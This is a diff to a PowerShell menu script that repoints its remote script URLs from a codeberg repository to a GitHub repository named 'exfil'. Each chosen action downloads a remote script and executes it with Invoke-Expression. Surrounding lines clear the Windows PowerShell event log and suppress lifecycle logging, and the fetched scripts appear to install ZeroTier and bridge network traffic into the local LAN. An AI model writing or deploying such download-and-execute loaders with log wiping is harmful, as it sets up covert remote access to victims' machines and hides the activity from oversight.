@@ -27,7 +27,7 @@ function Show-ActionMenu {
         }
         if ($selectedActionIndex -eq 'b') {
             Write-Host "Going to Master Control..." -ForegroundColor Green
-            $additionalUrl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/MasterControl.ps1"
+            $additionalUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/MasterControl.ps1"
             $additionalContent = (Invoke-WebRequest -Uri $additionalUrl -UseBasicParsing).Content
             Invoke-Expression $additionalContent
             continue
@@ -53,9 +53,9 @@ Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
 $actions = @(
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/ZeroTierStuff/ZTInstall.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/ZeroTierStuff/ZTNetJoinLeaveHandler.ps1",
-    "https://codeberg.org/sempiampi/mavericks/raw/branch/main/ZeroTierStuff/ZTPassthroughToLan.ps1"
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZTInstall.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZTNetJoinLeaveHandler.ps1",
+    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZTPassthroughToLan.ps1"
 )
     
 # Call the function to display the action menu and execute the selected action or quit
